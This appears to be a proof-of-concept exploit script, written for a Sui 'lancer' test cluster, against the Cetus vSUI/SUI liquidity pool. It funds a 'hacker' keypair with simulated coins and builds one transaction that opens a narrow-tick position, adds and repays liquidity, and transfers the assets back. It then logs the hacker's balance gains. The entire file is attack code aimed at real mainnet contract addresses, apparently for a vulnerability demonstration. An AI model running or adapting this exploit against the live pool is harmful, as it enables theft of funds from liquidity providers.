let effect @ { Eff, ? } = import! std.effect
let { read_file_to_string, read_dir ? } = import! lancer.effect.file_system
let { log, ? } = import! lancer.effect.logger
let { Reporting } = import! lancer.reporting
let { deserialize } = import! std.json.de
let { (<|), (<<) } = import! std.function
let { unwrap_ok, Result } = import! std.result
let {
    ObjectPtr,
    Object,
    ObjectData,
    MoveObject,
    from_inner_object,
    object_reference,
    object_id,
    ?
} = import! lancer.sui.object
let { ObjectRef, ObjectArg, ? } = import! lancer.transaction.builder.types
let { RpcObjectPtr, to_object, ? } = import! lancer.rpc.object
let { wrap } = import! std.applicative
let { ? } = import! std.array
let { for } = import! std.traversable
let { parse } = import! lancer.parse
let { TypeTag, StructTag, ? } = import! lancer.sui.types
let { SuiAddress, ? } = import! lancer.sui.sui_address
let digest @ { Digest, ? } = import! lancer.sui.digest
let { Coin, coin_to_bytes } = import! lancer.framework
let { Owner, ? } = import! lancer.rpc.types
let { from_int, UInt, ? } = import! lancer.types.uint

let {
    TestCluster,
    initialize,
    commit_preparation,
    commit_demonstration,
    generate_keypair,
    execute_tx,
    get_object,
    get_coins,
    get_balance,
    add_object,
} = import! lancer.effect.test_cluster

let {
    u8,
    u16,
    u32,
    u64,
    u128,
    bool,
    address,
    object_ref,
    publish_upgradeable,
    publish_immutable,
    move_call,
    nest_result,
    pay,
    split_coin,
} = import! lancer.effect.transaction_builder

let sui_framework : SuiAddress = unwrap_ok <| parse "0x0000000000000000000000000000000000000000000000000000000000000002"
let clock_id : SuiAddress = unwrap_ok <| parse "0x0000000000000000000000000000000000000000000000000000000000000006"
let cetus : SuiAddress = unwrap_ok <| parse "0xc6faf3703b0e8ba9ed06b7851134bbbe7565eb35ff823fd78432baa4cbeaa12e"
let global_config_id : SuiAddress = unwrap_ok <| parse "0xdaa46292632c3c4d8f31f23ea0f9b36a28ff3677e9684980e4438403a67a3d8f"
let vsui_type: StructTag = {
    address = unwrap_ok <| parse "0x549e8b69270defbfafd4f94e17ec44cdbdd99820b33bda2278dea3b9a32d3f55",
    module = "cert",
    name = "CERT",
    type_params = [],
}
let sui_type: StructTag = {
    address = sui_framework,
    module = "sui",
    name = "SUI",
    type_params = [],
}

let position_type: StructTag = {
    address = cetus,
    module = "position",
    name = "Position",
    type_params = [],
}

let vsui_sui_pool_id : SuiAddress = unwrap_ok <| parse "0x6c545e78638c8c1db7a48b282bb8ca79da107993fcb185f75cedc1f5adb2f535"


do objects = read_dir "objects"
for objects <| \entry ->
    if entry.metadata.is_file then
        do data = read_file_to_string entry.path
        let obj : ObjectPtr = unwrap_ok <| deserialize data
        add_object obj
    else
        wrap ()

do hacker = generate_keypair


let hackers_vsui_id : SuiAddress = unwrap_ok <| parse "0x1b444811bdb14c1689c46012231d7a86e672327f75034a14784a3846482d5c09"

let initial_vsui_balance = 1000000000000

let hackers_vsui_object = from_inner_object {
    data = Move {
        type_ = {
            address = sui_framework,
            module = "coin",
            name = "Coin",
            type_params = [Struct vsui_type],
        },
        version = 1,
        contents = coin_to_bytes {
            id = {
                id = hackers_vsui_id,
            },
            balance = {
                value = initial_vsui_balance,
            }
        },
    },
    owner = AddressOwner hacker,
    previous_transaction = digest.zero,
    storage_rebate = 0,
}

add_object hackers_vsui_object

let hackers_sui_id : SuiAddress = unwrap_ok <| parse "0xd335e8aa19d6dc04273d77e364c936bad69db4905a4ab3b2733d644dd2b31e0a"

let initial_sui_balance = 100000000000

let hackers_sui_object = from_inner_object {
    data = Move {
        type_ = {
            address = sui_framework,
            module = "coin",
            name = "Coin",
            type_params = [Struct sui_type],
        },
        version = 1,
        contents = coin_to_bytes {
            id = {
                id = hackers_sui_id,
            },
            balance = {
                value = initial_sui_balance,
            }
        },
    },
    owner = AddressOwner hacker,
    previous_transaction = digest.zero,
    storage_rebate = 0,
}

add_object hackers_sui_object

initialize

do pool = get_object vsui_sui_pool_id

do admin = generate_keypair

commit_preparation [hacker]

do hackers_sui_data = get_object hackers_sui_id
do hackers_vsui_data = get_object hackers_vsui_id

log <| "Pool owner: " ++ show pool.owner
log <| "Pool id: " ++ (show <| object_id <| from_inner_object pool)

let delata_liquidity : UInt = unwrap_ok <| parse "200000000000"

do r = execute_tx 500000000 hacker (
    do global_config_arg = object_ref <| SharedObject {
        id = global_config_id,
        initial_shared_version = 1,
        mutable = False,
    }
    do pool_arg = object_ref <| SharedObject {
        id = vsui_sui_pool_id,
        initial_shared_version = 1,
        mutable = True,
    }
    do tick_lower_arg = u32 0
    do tick_upper_arg = u32 2
    // log "before open_position"
    do position_arg = move_call cetus "pool" "open_position" [ Struct vsui_type, Struct sui_type ] [
        global_config_arg,
        pool_arg,
        tick_lower_arg,
        tick_upper_arg
    ]
    do delta_liquidity_arg = u128 delata_liquidity
    do clock_arg = object_ref <| SharedObject {
        id = clock_id,
        initial_shared_version = 1,
        mutable = False,
    }
    do add_liquidity_receipt_arg = move_call cetus "pool" "add_liquidity" [  Struct vsui_type, Struct sui_type ] [
        global_config_arg,
        pool_arg,
        position_arg,
        delta_liquidity_arg,
        clock_arg
    ]
    do receipt_amounts_args = move_call cetus "pool" "add_liquidity_pay_amount" [  Struct vsui_type, Struct sui_type ] [
        add_liquidity_receipt_arg
    ]
    do vsui_coin_arg = object_ref <| ImmOrOwnedObject <| object_reference <| from_inner_object hackers_vsui_data
    do vsui_payment_coin_arg = split_coin vsui_coin_arg [nest_result receipt_amounts_args 0]
    do vsui_payment_balance_arg = move_call sui_framework "coin" "into_balance" [Struct vsui_type] [
        vsui_payment_coin_arg
    ]
    do sui_coin_arg = object_ref <| ImmOrOwnedObject <| object_reference <| from_inner_object hackers_sui_data
    do sui_payment_coin_arg = split_coin sui_coin_arg [nest_result receipt_amounts_args 1]
    do sui_payment_balance_arg = move_call sui_framework "coin" "into_balance" [Struct sui_type] [
        sui_payment_coin_arg
    ]
    move_call cetus "pool" "repay_add_liquidity" [  Struct vsui_type, Struct sui_type ] [
        global_config_arg,
        pool_arg,
        vsui_payment_balance_arg,
        sui_payment_balance_arg,
        add_liquidity_receipt_arg
    ]
    do hacker_arg = address hacker
    move_call sui_framework "transfer" "public_transfer" [Struct position_type] [
        position_arg,
        hacker_arg,
    ]
    move_call sui_framework "transfer" "public_transfer" [Struct {
            address = sui_framework,
            module = "coin",
            name = "Coin",
            type_params = [Struct vsui_type],
        }] [
        vsui_coin_arg,
        hacker_arg,
    ]
    move_call sui_framework "transfer" "public_transfer" [Struct {
            address = sui_framework,
            module = "coin",
            name = "Coin",
            type_params = [Struct sui_type],
        }] [
        sui_coin_arg,
        hacker_arg,
    ]

    // pay [object_reference <| from_inner_object hackers_sui_data] [1000000000] [admin]
)
do vsui_balance = get_balance vsui_type hacker
do sui_balance = get_balance sui_type hacker
log <| "delta vsui: " ++ show (vsui_balance - initial_vsui_balance)
log <| "delta sui: " ++ show (sui_balance - initial_sui_balance)

commit_demonstration "" Public
